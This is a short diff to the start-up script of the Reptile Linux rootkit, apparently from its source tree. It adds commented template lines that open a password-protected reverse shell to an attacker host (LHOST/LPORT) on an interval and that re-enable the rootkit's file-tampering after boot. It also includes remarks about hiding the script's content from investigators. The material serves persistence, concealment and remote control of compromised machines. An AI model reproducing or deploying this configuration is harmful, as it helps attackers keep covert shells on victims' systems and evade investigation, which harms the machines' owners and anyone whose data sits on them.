@@ -1,6 +1,22 @@
 #!/bin/bash
 #<XXXXX>
-#
+# 
 # YOU SHOULD PUT YOUR CUSTOM START ROUTINE HERE
+#
+#SHELL -t LHOST -p LPORT -s PASS -r INTERVAL
+#
+# This script should be executed after all hooks
+# raise up, to enable us use reptile features on 
+# its start up. Then the file-tampering feature 
+# starts disabled to enable load this script 
+# properly. So, after all, we should enable
+# file-tampering again
+#
+#CMD file-tampering
+#
+# Actually, there is no need to hide file content
+# of this script, because if someone tries to 
+# investigate this, it means Reptile was get caught.
+# But I am going to let this script as it is now ;)
 #
 #</XXXXX>
